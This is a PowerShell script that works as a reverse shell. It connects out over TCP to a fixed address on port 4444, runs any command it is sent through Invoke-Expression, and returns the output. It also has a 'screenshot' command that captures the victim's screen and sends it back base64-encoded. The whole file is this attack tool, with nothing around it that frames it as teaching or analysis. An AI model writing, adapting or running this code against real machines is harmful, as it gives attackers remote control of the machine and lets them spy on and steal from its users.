# --- THE TRIPLE-CHECKED STABLE SHELL ---
$ip = '192.168.1.15'
$port = 4444

# 1. Load Assemblies at the very top (If this fails, we know why)
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

try {
    # 2. Connect
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    $writer.WriteLine("--- CONNECTED TO: $env:COMPUTERNAME ---")

    # 3. The Only Loop
    while($client.Connected) {
        $writer.Write("PS " + (Get-Location).Path + "> ")
        $line = $reader.ReadLine()
        if ($null -eq $line) { break }
        
        $cmd = $line.Trim()
        if ($cmd -eq "exit") { break }

        # 4. Direct Logic (No Functions)
        if ($cmd -eq "screenshot") {
            $out = try {
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $res = [Convert]::ToBase64String($ms.ToArray())
                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
                $res # Return the base64
            } catch { "Screenshot failed: $($_.Exception.Message)" }
        } 
        else {
            # Standard Command Execution
            $out = try { iex $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
        }

        # 5. Send back
        $writer.WriteLine($out)
    }
} catch {
    # This prevents the window from closing so you can READ the error
    Write-Host "CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Press any key to close..."
    [void]$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
} finally {
    if ($client) { $client.Close() }
}
